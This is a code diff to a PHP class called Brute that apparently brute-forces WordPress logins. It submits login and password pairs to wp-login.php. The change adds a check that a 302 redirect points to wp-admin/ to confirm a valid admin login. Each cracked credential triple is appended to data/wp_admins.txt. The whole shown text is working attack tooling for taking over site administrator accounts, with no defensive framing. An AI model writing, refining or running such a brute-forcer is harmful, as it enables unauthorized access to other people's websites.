@@ -11,13 +11,6 @@ use Monolog\Logger;
 
 class Brute
 {
-    protected $client;
-
-    private $url;
-    private $login;
-    private $password;
-    private $iteration;
-
     public function __construct()
     {
         $this->client = (new HttpClientBuilder())
@@ -29,18 +22,13 @@ class Brute
     public function __invoke($data)
     {
         $url = explode(';', $data['url'])[0];
+        $admin_redirect_url = str_replace('wp-login.php', '', $url) . 'wp-admin/';
         $login = $this->loginCheck($data);
         $password = $this->passwordCheck($data, $login);
         $iteration = $this->checkIterator($data, $login, $password);
 
         if ($iteration == true) {
             $log = new Logger('name');
-
-//            var_dump([
-//                'login' => $login,
-//                'password' => $password,
-//                'iteration' => $iteration,
-//            ]);die;
 
             $body = new FormBody;
             $body->addField('log', $login);
@@ -54,7 +42,7 @@ class Brute
             $originalResponse = $response->getOriginalResponse();
 
 
-            if ($originalResponse->getStatus() === 302) {
+            if ($originalResponse->getStatus() === 302 && $originalResponse->getHeader('location') == $admin_redirect_url) {
                 $wp_admin = "{$url};{$login};{$password}";
                 file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
 
